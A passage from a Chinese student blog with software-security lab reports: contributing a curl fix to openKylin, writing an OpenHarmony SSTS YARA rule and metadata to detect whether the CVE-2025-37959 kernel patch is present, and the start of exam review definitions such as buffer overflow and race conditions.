<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img7.png" alt="图7"></p>
<p>（2）openkylin仓库：</p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img8.png" alt="图8"></p>
<h3 id="填写相关issue信息"><a href="#填写相关issue信息" class="headerlink" title="填写相关issue信息"></a>填写相关issue信息</h3><p>1.我们点击刚才终端中的那个链接，并将其打开，得到漏洞的相关描述信息</p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img9.png" alt="图9"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img10.png" alt="图10"></p>
<p>2.我们新建issue，根据上述信息来填写相关描述信息。</p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img11.png" alt="图11"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img12.png" alt="图12"></p>
<p>3.成功发布issue，完成贡献。</p>
<p><a href="https://gitee.com/openkylin/curl/issues/ID90N0?from=project-issue">https://gitee.com/openkylin/curl/issues/ID90N0?from=project-issue</a></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img13.png" alt="图13"></p>
<h3 id="修复相关漏洞"><a href="#修复相关漏洞" class="headerlink" title="修复相关漏洞"></a>修复相关漏洞</h3><p>1.将此仓库fork到我们本地仓库，之后git clone到本地，并找到相应的代码段，进行修改，之后git push提交。</p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img14.png" alt="图14"></p>
<p>2.修改完之后会push到本地仓库，我们需要建立与主仓库的Pull Requsets，并且绑定相应的issue。</p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img15.png" alt="图15"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img16.png" alt="图16"></p>
<p>3.查看我们提交的代码，完成贡献。</p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img17.png" alt="图17"></p>
<p>4.等待社区审核，可以看到解决了问题，已修复，issue完成</p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img18.png" alt="图18"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img19.png" alt="图19"></p>
<p>5.在pull requests查看社区老师审核结果，已合并，完成贡献。</p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img20.png" alt="图20"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img21.png" alt="图21"></p>
<p>相关链接：<a href="https://gitee.com/openkylin/curl/pulls/46">https://gitee.com/openkylin/curl/pulls/46</a></p>
<p><em>实验报告持续更新中…</em></p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>软件安全</tag>
        <tag>北邮</tag>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全开源贡献OpenHarmony</title>
    <url>/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="软件安全OpenHarmony开源贡献操作步骤"><a href="#软件安全OpenHarmony开源贡献操作步骤" class="headerlink" title="软件安全OpenHarmony开源贡献操作步骤"></a>软件安全OpenHarmony开源贡献操作步骤</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>1.下载SSTS套件：<a href="https://www.openharmony.cn/systematic?tab=xts">https://www.openharmony.cn/systematic?tab=xts</a></p>
<p>2.安装git，配置相关信息。</p>
<h3 id="镜像获取"><a href="#镜像获取" class="headerlink" title="镜像获取"></a>镜像获取</h3><p>1.在网址<a href="https://gitee.com/openharmony/security/tree/master/zh/security-disclosure/2025%E9%80%89%E6%8B%A9%E6%84%9F%E5%85%B4%E8%B6%A3%E7%9A%84issue%EF%BC%9ACVE-2025-37959">https://gitee.com/openharmony/security/tree/master/zh/security-disclosure/2025选择感兴趣的issue：CVE-2025-37959</a></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img1.png" alt="图1"></p>
<p>2.根据所选取的issue，前往载<a href="https://gitee.com/openharmony/docs/blob/master/zh-cn/release-notes/Readme.md%EF%BC%8C%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%E7%9A%84%E9%95%9C%E5%83%8F%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8B%E8%BD%BD%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%89%88%E6%9C%ACv5.0.3%E5%92%8C%E4%B8%8D%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%89%88%E6%9C%ACv5.1.0%E3%80%82">https://gitee.com/openharmony/docs/blob/master/zh-cn/release-notes/Readme.md，对应版本的镜像，这里下载存在漏洞的版本v5.0.3和不存在漏洞的版本v5.1.0。</a></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img2.png" alt="图2"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img3.png" alt="图3"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img4.png" alt="图4"></p>
<p>3.使用解压文件（注意下载文件为.tar.gz格式，需要解压两次），得到boot_linux.img文件，将boot_linux.img再次解压后找到Image文件，如下图。</p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img5.png" alt="图5"></p>
<p>4.使用SSTS套件resourse文件夹下的vml inux_to_elf.exe文件将Image转化为elf文件，为便于区分，分别命名为unfix_5.0.3.elf和unfix_5.1.0.elf见下图。</p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img6.png" alt="图6"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img7.png" alt="图7"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img8.png" alt="图8"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img9.png" alt="图9"></p>
<h3 id="确定问题，编写规则"><a href="#确定问题，编写规则" class="headerlink" title="确定问题，编写规则"></a>确定问题，编写规则</h3><p>1.根据issue描述，使用ida定位问题机器码（找到我们漏洞的修复链接，这里展示的是CVE-2025-37959：查找问题函数skb_do_redirect即可找到），根据机器码不同编写在SSTS套件的\testcases目录下编写相应的规则，和漏洞信息json文件。</p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img10.png" alt="图10"></p>
<p>2.这样我们就找到了修改的函数名，再去IDA中根据函数名寻找函数，根据逻辑判断，5.0.3中的这个函数是未修改的版本，5.1.0的对应函数我们发现已修改。现在我们提取特征的16进制子串。</p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img11.png" alt="图11"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img12.png" alt="图12"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img13.png" alt="图13"></p>
<p>3.接下来编写yara</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*  </span><br><span class="line">  * Copyright (c) 2024 Beijing University of Posts and Telecommunications.</span><br><span class="line">  *  </span><br><span class="line">  * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);  </span><br><span class="line">  * you may not use this file except in compliance with the License.  </span><br><span class="line">  * You may obtain a copy of the License at  </span><br><span class="line">  *  </span><br><span class="line">  * http://www.apache.org/licenses/LICENSE-2.0  </span><br><span class="line">  *  </span><br><span class="line">  * Unless required by applicable law or agreed to in writing, software  </span><br><span class="line">  * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,  </span><br><span class="line">  * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  </span><br><span class="line">  * See the License for the specific language governing permissions and  </span><br><span class="line">  * limitations under the License.  </span><br><span class="line">  */ </span><br><span class="line"></span><br><span class="line">import &quot;console&quot;</span><br><span class="line"></span><br><span class="line">rule TestCaseRule_CVE_2025_37959</span><br><span class="line">&#123;</span><br><span class="line">    meta:</span><br><span class="line">        date=&quot;2025-11&quot;</span><br><span class="line">        openharmony_sa=&quot;&quot;</span><br><span class="line">        cve=&quot;CVE-2025-37959&quot;</span><br><span class="line">        file=&quot;/dev/block/platform/fe310000.sdhci/by-name/boot_linux&quot;</span><br><span class="line">  </span><br><span class="line">    strings:</span><br><span class="line">        $fix = &#123;42 53 FF 97 A8 02 1E 12 1F 00 00 F1 00 19 40 7A DF 02 00 F9 A0 00 00 54 E0 03 14 AA F8 00 FF 97&#125;</span><br><span class="line"></span><br><span class="line">    condition: </span><br><span class="line">        $fix and console.log(&quot;CVE-2025-37959 testcase pass&quot;) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4.使用编写的规则进行SSTS测试，测试通过。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./yara64.exe <span class="string">&quot;C:\\Users\\1\\Desktop\\security\\vulntest\\SSTSTestcases\\2025\\CVE-2025-37959\\TestCaseRule-CVE-2025-37959.yara&quot;</span> <span class="string">&quot;G:\\5.0.3\\boot_linux\\extlinux\\unfix_5.0.3.elf&quot;</span></span><br><span class="line">./yara64.exe <span class="string">&quot;C:\\Users\\1\\Desktop\\security\\vulntest\\SSTSTestcases\\2025\\CVE-2025-37959\\TestCaseRule-CVE-2025-37959.yara&quot;</span> <span class="string">&quot;G:\\5.0.3\\boot_linux\\fixed\\fixed_5.0.3.elf&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img14.png" alt="图14"></p>
<p>5.编写json文件</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;month&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;release_time&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;vulnerabilities&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;month&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;vul_id&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;cve&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2025-37959&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;openharmony-sa&quot;</span><span class="punctuation">:</span> <span class="string">&quot; &quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;medium&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;vul_description&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;zh&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bpf_redirect_peer在跨网络命名空间重定向数据包时缺少必要的skb清理操作，导致XFRM解密状态等扩展信息在命名空间间泄露，引发目标命名空间中的XFRM策略检查异常。&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bpf_redirect_peer lacks necessary skb scrubbing when redirecting packets across network namespaces, causing leakage of extension information such as XFRM decryption state between namespaces and triggering XFRM policy check anomalies in the target namespace.&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;vul_impact&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;zh&quot;</span><span class="punctuation">:</span> <span class="string">&quot;该漏洞破坏网络命名空间隔离性，可能导致加密通信数据包被错误丢弃，影响基于BPF重定向的容器网络功能的正常运行。&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;This vulnerability breaks network namespace isolation, potentially causing encrypted communication packets to be incorrectly dropped, affecting the normal operation of BPF-based container networking features.&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;disclosure&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;zh&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://gitee.com/openharmony/security/blob/master/zh/security-disclosure/2025/2025-09.md&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://gitee.com/openharmony/security/blob/master/en/security-disclosure/2025/2025-09.md&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;patch_info&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;5.0.x&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;patch_url&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="string">&quot;https://gitee.com/openharmony/kernel_linux_5.10/commit/&lt;commit-for-5.0.x&gt;&quot;</span></span><br><span class="line">                    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;patch_file&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="string">&quot;https://gitee.com/openharmony/kernel_linux_5.10/commit/&lt;commit-for-5.0.x&gt;.patch&quot;</span></span><br><span class="line">                    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;diff_file&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="string">&quot;https://gitee.com/openharmony/kernel_linux_5.10/commit/&lt;commit-for-5.0.x&gt;.diff&quot;</span></span><br><span class="line">                    <span class="punctuation">]</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;affected_projects&quot;</span><span class="punctuation">:</span> <span class="string">&quot;kernel_linux_5.10&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;object_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;kernel_linux&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;affected_versions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;5.0.0-5.0.3&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;affected_device&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;mini&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;liteos&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;rics-v&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;scan_strategy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;ssts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;enable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;ists&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;enable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">                <span class="attr">&quot;small&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;liteos&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;rics-v&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;scan_strategy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;ssts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;enable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;ists&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;enable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;linux&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;arm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;scan_strategy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;ssts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;enable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;ists&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;enable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">                <span class="attr">&quot;standard&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;linux&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;arm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;scan_strategy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;ssts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;enable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;ists&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;enable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;yara&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                        <span class="attr">&quot;affected_files&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                            <span class="string">&quot;/dev/block/platform/fe310000.sdhci/by-name/boot_linux&quot;</span></span><br><span class="line">                                        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                                        <span class="attr">&quot;yara_rules&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                            <span class="string">&quot;TestCaseRule-CVE-2025-37959.yara&quot;</span></span><br><span class="line">                                        <span class="punctuation">]</span></span><br><span class="line">                                    <span class="punctuation">&#125;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;arm64&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;scan_strategy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;ssts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;enable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;ists&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;enable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="创建PR"><a href="#创建PR" class="headerlink" title="创建PR"></a>创建PR</h3><p>1.Fork开源SSTS测试的库<a href="https://gitcode.com/openharmony/security%E5%88%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BB%93%E5%BA%93%EF%BC%8C%E5%85%8B%E9%9A%86Fork%E5%90%8E%E7%9A%84%E4%BB%93%E5%BA%93%EF%BC%8C%E8%BF%9B%E8%A1%8C%E5%B0%86%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6%E6%8C%89%E7%85%A7%E6%A0%BC%E5%BC%8F%E8%A6%81%E6%B1%82%E6%8F%90%E4%BA%A4%EF%BC%8Ccommit%E4%B8%BA%E2%80%9CSSTS%E6%96%B0%E5%A2%9E%E8%A7%84%E5%88%99%EF%BC%9ACVE-2025-37959%E2%80%9D%E3%80%82">https://gitcode.com/openharmony/security到自己的仓库，克隆Fork后的仓库，进行将相关文件按照格式要求提交，commit为“SSTS新增规则：CVE-2025-37959”。</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit --signoff -m <span class="string">&quot;SSTS新增规则：CVE-2025-37959&quot;</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure>

<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img15.png" alt="图15"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img16.png" alt="图16"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img17.png" alt="图17"></p>
<p>2.发起Pull Request。</p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img18.png" alt="图18"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img19.png" alt="图19"></p>
<p>3.贡献完成，获得合入。</p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CHarmony/img20.png" alt="图20"></p>
<p>相关链接：<a href="https://gitcode.com/openharmony/security/pull/459">https://gitcode.com/openharmony/security/pull/459</a></p>
<p><em>实验报告持续更新中…</em></p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>软件安全</tag>
        <tag>北邮</tag>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全期末复习</title>
    <url>/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>授课：徐国胜</p>
<h2 id="考试必备：概念题-简答题"><a href="#考试必备：概念题-简答题" class="headerlink" title="考试必备：概念题&#x2F;简答题"></a>考试必备：概念题&#x2F;简答题</h2><h3 id="名词解释题"><a href="#名词解释题" class="headerlink" title="名词解释题"></a>名词解释题</h3><p><strong>1.整数回绕</strong></p>
<p>整数在<strong>固定位宽</strong>（如32位无符号&#x2F;有符号）表示下进行运算，结果<strong>超过可表示范围时</strong>会<strong>回到起始处继续计数</strong>（模2^n）。</p>
<p>常见风险：长度计算、内存分配大小计算出错，导致分配偏小进而引发溢出&#x2F;越界写。</p>
<p><strong>2.缓冲区溢出攻击</strong></p>
<p>计算机向缓冲区内<strong>填充数据位数超过了缓冲区本身的容量</strong>，溢出的数据<strong>覆盖在合法数据上</strong>，淹没<strong>局部变量</strong>、淹没<strong>返回地址。</strong></p>
<p><strong>3.恶意软件</strong></p>
<p>以<strong>危害系统、窃取信息、控制主机</strong>为目的的软件统称，如病毒、蠕虫、木马、勒索软件等。常通过漏洞、钓鱼、驱动&#x2F;浏览器组件等途径植入。</p>
<p><strong>4.有效用户ID</strong></p>
<p>在<strong>类Unix系统</strong>中用于<strong>权限判定的实际生效身份</strong>，决定<strong>进程访问文件、资源的权限</strong>；可<strong>与真实UID不同</strong>。</p>
<p><strong>5.竞争条件</strong></p>
<p><strong>并发执行</strong>的多个线程、进程在访问共享资源时，由于<strong>时序不确定导致结果依赖竞速顺序</strong>，产生<strong>逻辑错误或安全漏洞</strong>。</p>
<p><strong>6.ESP、EBP、EIP</strong></p>
<p>EAX：常用于<strong>记录返回值</strong>，以及用来进行算数运算。</p>
<p>ECX：<strong>常用于计数</strong>，以及用来算术运算。</p>
